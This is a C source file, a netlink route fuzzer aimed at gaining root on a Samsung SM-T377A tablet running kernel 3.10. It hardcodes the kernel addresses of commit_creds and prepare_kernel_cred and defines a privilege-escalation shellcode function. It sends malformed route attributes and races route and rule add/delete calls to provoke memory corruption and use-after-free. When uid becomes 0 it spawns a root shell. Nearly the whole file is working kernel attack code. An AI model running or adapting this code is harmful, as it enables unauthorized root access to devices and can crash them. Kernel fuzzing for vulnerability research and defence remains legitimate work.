/*
 * netlink_route_fuzz.c — NETLINK_ROUTE attribute parsing fuzzer
 *
 * Samsung SM-T377A, kernel 3.10.9, Android 6.0.1
 *
 * NETLINK_ROUTE is accessible from shell (UID 2000). This fuzzer targets
 * the rtnetlink attribute parsing in the kernel, which has had multiple
 * vulnerabilities on kernel 3.10:
 *
 *   - Integer overflow in nla_len validation
 *   - Stack buffer overflow in route attribute parsing (fib_props)
 *   - Use-after-free in FIB rule handling
 *   - Off-by-one in nested attribute validation
 *
 * Strategy:
 *   1. Send malformed RTM_NEWROUTE/DELROUTE with crafted NLA attributes
 *   2. Send RTM_NEWRULE/DELRULE to trigger FIB rule code paths
 *   3. Race route add/delete to trigger UAF in FIB tree
 *   4. Overflow NLA attribute lengths to trigger heap corruption
 *   5. Use BPF/pipe spray to reclaim freed FIB objects
 *
 * Kernel addresses (no KASLR):
 *   commit_creds:        0xC0054328
 *   prepare_kernel_cred: 0xC00548E0
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pthread.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>

/* Kernel addresses */
#define COMMIT_CREDS        0xC0054328
#define PREPARE_KERNEL_CRED 0xC00548E0

/* Route attribute types */
#define RTA_DST       1
#define RTA_SRC       2
#define RTA_IIF       3
#define RTA_OIF       4
#define RTA_GATEWAY   5
#define RTA_PRIORITY  6
#define RTA_PREFSRC   7
#define RTA_METRICS   8
#define RTA_MULTIPATH 9
#define RTA_FLOW      11
#define RTA_CACHEINFO 12
#define RTA_TABLE     15
#define RTA_MARK      16

/* FIB rule attributes */
#define FRA_DST        1
#define FRA_SRC        2
#define FRA_IIFNAME    3
#define FRA_GOTO       4
#define FRA_PRIORITY   6
#define FRA_FWMARK     10
#define FRA_FWMASK     11
#define FRA_TABLE      15
#define FRA_OIFNAME    17

/* Netlink attribute helpers */
#define NLA_ALIGN(len)    (((len) + 3) & ~3)
#define NLA_HDRLEN        4

struct nlattr_hdr {
    unsigned short nla_len;
    unsigned short nla_type;
};

/* Shellcode */
typedef unsigned long (*commit_creds_fn)(unsigned long);
typedef unsigned long (*prepare_kernel_cred_fn)(unsigned long);

static volatile int g_got_root = 0;

static void __attribute__((noinline, optimize("O0")))
kernel_shellcode(void) {
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)PREPARE_KERNEL_CRED;
    unsigned long new_cred = pkc(0);
    if (new_cred) {
        commit_creds_fn cc = (commit_creds_fn)COMMIT_CREDS;
        cc(new_cred);
        g_got_root = 1;
    }
}

/* ================================================================ */

static int nl_socket(void) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) return -1;

    struct sockaddr_nl sa = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
    };
    /* Don't bind — let kernel auto-assign */
    return fd;
}

static int nl_send(int fd, void *buf, int len) {
    struct sockaddr_nl dest = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0, /* kernel */
    };
    return sendto(fd, buf, len, 0,
                  (struct sockaddr *)&dest, sizeof(dest));
}

static int nl_recv(int fd, void *buf, int buflen) {
    return recv(fd, buf, buflen, MSG_DONTWAIT);
}

/* Add a netlink attribute to a buffer */
static int add_attr(void *buf, int maxlen, int type,
                    const void *data, int datalen) {
    struct nlattr_hdr *nla = (struct nlattr_hdr *)buf;
    int total = NLA_ALIGN(NLA_HDRLEN + datalen);
    if (total > maxlen) return -1;

    nla->nla_len = NLA_HDRLEN + datalen;
    nla->nla_type = type;
    if (data && datalen > 0)
        memcpy((char *)buf + NLA_HDRLEN, data, datalen);
    /* Zero padding */
    if (total > (int)(NLA_HDRLEN + datalen))
        memset((char *)buf + NLA_HDRLEN + datalen, 0,
               total - NLA_HDRLEN - datalen);
    return total;
}

/* ================================================================
 * FUZZ 1: Malformed route attributes
 * ================================================================ */

static void fuzz_route_attributes(int fd, int iterations) {
    printf("\n=== FUZZ 1: Route attribute malformation (%d iters) ===\n",
           iterations);

    int anomalies = 0;
    char buf[4096];
    char resp[8192];

    for (int i = 0; i < iterations; i++) {
        memset(buf, 0, sizeof(buf));

        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        struct rtmsg *rtm = (struct rtmsg *)NLMSG_DATA(nlh);

        /* Random message type */
        int types[] = { RTM_NEWROUTE, RTM_DELROUTE, RTM_GETROUTE };
        nlh->nlmsg_type = types[rand() % 3];
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
        nlh->nlmsg_seq = i;
        nlh->nlmsg_pid = getpid();

        rtm->rtm_family = (rand() % 2) ? AF_INET : AF_INET6;
        rtm->rtm_dst_len = rand() % 129; /* 0-128 for v6 */
        rtm->rtm_src_len = rand() % 129;
        rtm->rtm_table = RT_TABLE_MAIN;
        rtm->rtm_protocol = RTPROT_BOOT;
        rtm->rtm_scope = RT_SCOPE_UNIVERSE;
        rtm->rtm_type = RTN_UNICAST;

        /* Build attributes after rtmsg */
        char *attrp = (char *)rtm + NLMSG_ALIGN(sizeof(struct rtmsg));
        int attrspace = sizeof(buf) - (attrp - buf);
        int attrlen = 0;

        /* Strategy varies per iteration */
        switch (i % 8) {
        case 0: {
            /* Normal-ish route with random dst */
            unsigned int dst = rand();
            int n = add_attr(attrp + attrlen, attrspace - attrlen,
                           RTA_DST, &dst, 4);
            if (n > 0) attrlen += n;
            unsigned int gw = rand();
            n = add_attr(attrp + attrlen, attrspace - attrlen,
                        RTA_GATEWAY, &gw, 4);
            if (n > 0) attrlen += n;
            int oif = 1; /* lo */
            n = add_attr(attrp + attrlen, attrspace - attrlen,
                        RTA_OIF, &oif, 4);
            if (n > 0) attrlen += n;
            break;
        }
        case 1: {
            /* Oversized attribute length (integer overflow attempt) */
            struct nlattr_hdr *nla = (struct nlattr_hdr *)(attrp + attrlen);
            nla->nla_len = 0xFFFF; /* Max u16 */
            nla->nla_type = RTA_DST;
            attrlen += 8;
            break;
        }
        case 2: {
            /* Zero-length attribute */
            struct nlattr_hdr *nla = (struct nlattr_hdr *)(attrp + attrlen);
            nla->nla_len = 0;
            nla->nla_type = RTA_DST;
            attrlen += 4;
            break;
        }
        case 3: {
            /* Nested attribute with wrong inner lengths */
            struct nlattr_hdr *outer = (struct nlattr_hdr *)(attrp + attrlen);
            outer->nla_len = 64;
            outer->nla_type = RTA_METRICS | 0x8000; /* NLA_F_NESTED */

            /* Inner attributes with bad lengths */
            struct nlattr_hdr *inner = (struct nlattr_hdr *)((char *)outer + 4);
            inner->nla_len = 200; /* Claims more than outer */
            inner->nla_type = 1; /* RTAX_LOCK */
            memset((char *)inner + 4, 'B', 56);

            attrlen += 64;
            break;
        }
        case 4: {
            /* Many attributes to exhaust parsing */
            for (int j = 0; j < 100 && attrlen < (int)(sizeof(buf) - 256); j++) {
                unsigned int val = rand();
                int type = rand() % 20;
                int n = add_attr(attrp + attrlen, attrspace - attrlen,
                               type, &val, 4);
                if (n > 0) attrlen += n;
            }
            break;
        }
        case 5: {
            /* RTA_MULTIPATH with crafted nexthop entries */
            struct nlattr_hdr *nla = (struct nlattr_hdr *)(attrp + attrlen);
            nla->nla_len = NLA_HDRLEN + 128;
            nla->nla_type = RTA_MULTIPATH;
            /* Fill with crafted rtnexthop structures */
            char *mp = (char *)nla + NLA_HDRLEN;
            struct {
                unsigned short rtnh_len;
                unsigned char rtnh_flags;
                unsigned char rtnh_hops;
                int rtnh_ifindex;
            } *nh = (void *)mp;
            /* Overflow: claim huge length */
            nh->rtnh_len = 0xFFF0;
            nh->rtnh_flags = 0;
            nh->rtnh_hops = 0;
            nh->rtnh_ifindex = 1;
            memset(mp + 8, 'C', 120);
            attrlen += NLA_ALIGN(NLA_HDRLEN + 128);
            break;
        }
        case 6: {
            /* Attribute with type > max known */
            unsigned int val = 0xDEADBEEF;
            int n = add_attr(attrp + attrlen, attrspace - attrlen,
                           0x7FFF, &val, 4); /* Unknown type */
            if (n > 0) attrlen += n;
            break;
        }
        case 7: {
            /* IPv6 route with IPv4-sized attributes (size mismatch) */
            rtm->rtm_family = AF_INET6;
            rtm->rtm_dst_len = 128;
            unsigned int small_dst = rand(); /* Only 4 bytes for IPv6 */
            int n = add_attr(attrp + attrlen, attrspace - attrlen,
                           RTA_DST, &small_dst, 4);
            if (n > 0) attrlen += n;
            break;
        }
        }

        nlh->nlmsg_len = (attrp - buf) + attrlen;

        int ret = nl_send(fd, buf, nlh->nlmsg_len);
        if (ret < 0 && errno != EPERM && errno != EACCES) {
            if (i < 5 || errno != 22)
                printf("  [%d] send err=%d(%s) type=%d\n",
                       i, errno, strerror(errno), nlh->nlmsg_type);
        }

        /* Drain responses */
        while (nl_recv(fd, resp, sizeof(resp)) > 0) {}

        if (getuid() == 0) {
            printf("  [!!!] GOT ROOT at iteration %d!\n", i);
            anomalies++;
            break;
        }
    }

    printf("  Done. anomalies=%d uid=%d\n", anomalies, getuid());
}

/* ================================================================
 * FUZZ 2: FIB rule manipulation race
 *
 * Race: add/delete FIB rules simultaneously from multiple threads.
 * FIB rule code has had UAF bugs when rules are deleted while
 * still being traversed.
 * ================================================================ */

static volatile int rule_race_running = 0;
static volatile int rule_race_anomalies = 0;
static volatile int rule_race_ops = 0;

static void *rule_add_thread(void *arg) {
    int fd = nl_socket();
    if (fd < 0) return NULL;

    char buf[512];
    while (rule_race_running) {
        memset(buf, 0, sizeof(buf));
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        struct rtmsg *rtm = (struct rtmsg *)NLMSG_DATA(nlh);

        nlh->nlmsg_type = RTM_NEWRULE;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
        nlh->nlmsg_seq = __sync_fetch_and_add(&rule_race_ops, 1);
        nlh->nlmsg_pid = getpid();

        rtm->rtm_family = AF_INET;
        rtm->rtm_dst_len = 32;
        rtm->rtm_table = RT_TABLE_MAIN;
        rtm->rtm_type = RTN_UNICAST;
        rtm->rtm_scope = RT_SCOPE_UNIVERSE;

        char *attrp = (char *)rtm + NLMSG_ALIGN(sizeof(struct rtmsg));
        int attrlen = 0;

        unsigned int dst = 0x7F000001 + (rand() % 0xFF);
        int n = add_attr(attrp, 256, FRA_DST, &dst, 4);
        if (n > 0) attrlen += n;

        unsigned int prio = 100 + (rand() % 100);
        n = add_attr(attrp + attrlen, 256 - attrlen,
                    FRA_PRIORITY, &prio, 4);
        if (n > 0) attrlen += n;

        nlh->nlmsg_len = (attrp - buf) + attrlen;
        nl_send(fd, buf, nlh->nlmsg_len);

        /* Drain */
        char resp[1024];
        nl_recv(fd, resp, sizeof(resp));
    }

    close(fd);
    return NULL;
}

static void *rule_del_thread(void *arg) {
    int fd = nl_socket();
    if (fd < 0) return NULL;

    char buf[512];
    while (rule_race_running) {
        memset(buf, 0, sizeof(buf));
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        struct rtmsg *rtm = (struct rtmsg *)NLMSG_DATA(nlh);

        nlh->nlmsg_type = RTM_DELRULE;
        nlh->nlmsg_flags = NLM_F_REQUEST;
        nlh->nlmsg_seq = __sync_fetch_and_add(&rule_race_ops, 1);
        nlh->nlmsg_pid = getpid();

        rtm->rtm_family = AF_INET;
        rtm->rtm_table = RT_TABLE_MAIN;

        unsigned int prio = 100 + (rand() % 100);
        char *attrp = (char *)rtm + NLMSG_ALIGN(sizeof(struct rtmsg));
        int attrlen = 0;
        int n = add_attr(attrp, 256, FRA_PRIORITY, &prio, 4);
        if (n > 0) attrlen += n;

        nlh->nlmsg_len = (attrp - buf) + attrlen;
        nl_send(fd, buf, nlh->nlmsg_len);

        /* Drain */
        char resp[1024];
        nl_recv(fd, resp, sizeof(resp));
    }

    close(fd);
    return NULL;
}

static void fuzz_rule_race(int duration) {
    printf("\n=== FUZZ 2: FIB rule add/delete race (%ds) ===\n", duration);

    rule_race_running = 1;
    rule_race_ops = 0;
    rule_race_anomalies = 0;

    pthread_t add_threads[2], del_threads[2];
    for (int i = 0; i < 2; i++) {
        pthread_create(&add_threads[i], NULL, rule_add_thread, NULL);
        pthread_create(&del_threads[i], NULL, rule_del_thread, NULL);
    }

    sleep(duration);
    rule_race_running = 0;

    for (int i = 0; i < 2; i++) {
        pthread_join(add_threads[i], NULL);
        pthread_join(del_threads[i], NULL);
    }

    printf("  ops=%d anomalies=%d uid=%d\n",
           rule_race_ops, rule_race_anomalies, getuid());
}

/* ================================================================
 * FUZZ 3: Route add/delete + lookup race
 *
 * Add routes rapidly while looking them up from another thread.
 * On kernel 3.10, the FIB trie lookup/insert paths may race.
 * ================================================================ */

static volatile int route_race_running = 0;
static volatile int route_race_ops = 0;

static void *route_add_del_thread(void *arg) {
    int fd = nl_socket();
    if (fd < 0) return NULL;

    char buf[512];
    while (route_race_running) {
        memset(buf, 0, sizeof(buf));
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        struct rtmsg *rtm = (struct rtmsg *)NLMSG_DATA(nlh);

        /* Alternate add/delete */
        int op = __sync_fetch_and_add(&route_race_ops, 1);
        nlh->nlmsg_type = (op % 2) ? RTM_NEWROUTE : RTM_DELROUTE;
        nlh->nlmsg_flags = NLM_F_REQUEST;
        if (nlh->nlmsg_type == RTM_NEWROUTE)
            nlh->nlmsg_flags |= NLM_F_CREATE | NLM_F_REPLACE;
        nlh->nlmsg_seq = op;
        nlh->nlmsg_pid = getpid();

        rtm->rtm_family = AF_INET;
        rtm->rtm_dst_len = 32;
        rtm->rtm_table = RT_TABLE_MAIN;
        rtm->rtm_protocol = RTPROT_BOOT;
        rtm->rtm_scope = RT_SCOPE_LINK;
        rtm->rtm_type = RTN_UNICAST;

        char *attrp = (char *)rtm + NLMSG_ALIGN(sizeof(struct rtmsg));
        int attrlen = 0;

        /* Use a small set of destinations to increase collision rate */
        unsigned int dst = htonl(0x0A000000 + (rand() % 16));
        int n = add_attr(attrp, 256, RTA_DST, &dst, 4);
        if (n > 0) attrlen += n;

        int oif = 1; /* loopback */
        n = add_attr(attrp + attrlen, 256 - attrlen, RTA_OIF, &oif, 4);
        if (n > 0) attrlen += n;

        nlh->nlmsg_len = (attrp - buf) + attrlen;
        nl_send(fd, buf, nlh->nlmsg_len);

        /* Drain */
        char resp[1024];
        nl_recv(fd, resp, sizeof(resp));
    }

    close(fd);
    return NULL;
}

static void *route_lookup_thread(void *arg) {
    int fd = nl_socket();
    if (fd < 0) return NULL;

    char buf[512];
    while (route_race_running) {
        memset(buf, 0, sizeof(buf));
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        struct rtmsg *rtm = (struct rtmsg *)NLMSG_DATA(nlh);

        nlh->nlmsg_type = RTM_GETROUTE;
        nlh->nlmsg_flags = NLM_F_REQUEST;
        nlh->nlmsg_seq = rand();
        nlh->nlmsg_pid = getpid();

        rtm->rtm_family = AF_INET;
        rtm->rtm_dst_len = 32;

        char *attrp = (char *)rtm + NLMSG_ALIGN(sizeof(struct rtmsg));
        unsigned int dst = htonl(0x0A000000 + (rand() % 16));
        int attrlen = 0;
        int n = add_attr(attrp, 256, RTA_DST, &dst, 4);
        if (n > 0) attrlen += n;

        nlh->nlmsg_len = (attrp - buf) + attrlen;
        nl_send(fd, buf, nlh->nlmsg_len);

        char resp[4096];
        nl_recv(fd, resp, sizeof(resp));
    }

    close(fd);
    return NULL;
}

static void fuzz_route_race(int duration) {
    printf("\n=== FUZZ 3: Route add/delete + lookup race (%ds) ===\n",
           duration);

    route_race_running = 1;
    route_race_ops = 0;

    pthread_t mutators[3], lookers[2];
    for (int i = 0; i < 3; i++)
        pthread_create(&mutators[i], NULL, route_add_del_thread, NULL);
    for (int i = 0; i < 2; i++)
        pthread_create(&lookers[i], NULL, route_lookup_thread, NULL);

    sleep(duration);
    route_race_running = 0;

    for (int i = 0; i < 3; i++)
        pthread_join(mutators[i], NULL);
    for (int i = 0; i < 2; i++)
        pthread_join(lookers[i], NULL);

    printf("  ops=%d uid=%d\n", route_race_ops, getuid());
}

/* ================================================================
 * FUZZ 4: Netlink socket close race with sendmsg
 *
 * Race: Thread A sends netlink messages while Thread B closes
 * the socket fd. On kernel 3.10, netlink_sendmsg may access
 * freed socket after close.
 * ================================================================ */

static volatile int nlclose_race_running = 0;
static volatile int nlclose_race_anomalies = 0;
static volatile int nlclose_race_ops = 0;

static void *nlclose_send_thread(void *arg) {
    char buf[256];
    while (nlclose_race_running) {
        int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (fd < 0) continue;

        memset(buf, 0, sizeof(buf));
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtgenmsg));
        nlh->nlmsg_type = RTM_GETLINK;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
        nlh->nlmsg_pid = getpid();

        struct sockaddr_nl dest = { .nl_family = AF_NETLINK };

        /* Send rapidly — race with close */
        for (int i = 0; i < 50; i++) {
            sendto(fd, buf, nlh->nlmsg_len, MSG_DONTWAIT,
                   (struct sockaddr *)&dest, sizeof(dest));
            __sync_fetch_and_add(&nlclose_race_ops, 1);
        }
        close(fd);
    }
    return NULL;
}

static void fuzz_nlclose_race(int duration) {
    printf("\n=== FUZZ 4: Netlink socket close race (%ds) ===\n", duration);

    nlclose_race_running = 1;
    nlclose_race_ops = 0;
    nlclose_race_anomalies = 0;

    pthread_t threads[4];
    for (int i = 0; i < 4; i++)
        pthread_create(&threads[i], NULL, nlclose_send_thread, NULL);

    sleep(duration);
    nlclose_race_running = 0;

    for (int i = 0; i < 4; i++)
        pthread_join(threads[i], NULL);

    printf("  ops=%d anomalies=%d uid=%d\n",
           nlclose_race_ops, nlclose_race_anomalies, getuid());
}

/* ================================================================ */

int main(int argc, char **argv) {
    int duration = 15;
    int iterations = 500;

    if (argc > 1) duration = atoi(argv[1]);
    if (argc > 2) iterations = atoi(argv[2]);

    printf("=== NETLINK_ROUTE Fuzzer for SM-T377A ===\n");
    printf("[*] uid=%d pid=%d\n", getuid(), getpid());
    printf("[*] Race duration: %ds, attr iterations: %d\n",
           duration, iterations);
    printf("[*] WARNING: panic_on_oops=1 — kernel oops will reboot!\n");

    srand(time(NULL) ^ getpid());

    /* Skip shellcode mapping — focus on fuzzing only */
    printf("[*] Fuzzer mode only (no shellcode mapping)\n");

    int fd = nl_socket();
    if (fd < 0) {
        printf("[-] NETLINK_ROUTE socket failed: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] NETLINK_ROUTE socket: fd=%d\n", fd);

    /* Run fuzzers */
    fuzz_route_attributes(fd, iterations);
    close(fd);

    fuzz_rule_race(duration);
    fuzz_route_race(duration);
    fuzz_nlclose_race(duration);

    printf("\n=== Final uid=%d ===\n", getuid());
    if (getuid() == 0) {
        printf("[!!!] GOT ROOT!\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    return getuid() == 0 ? 0 : 1;
}
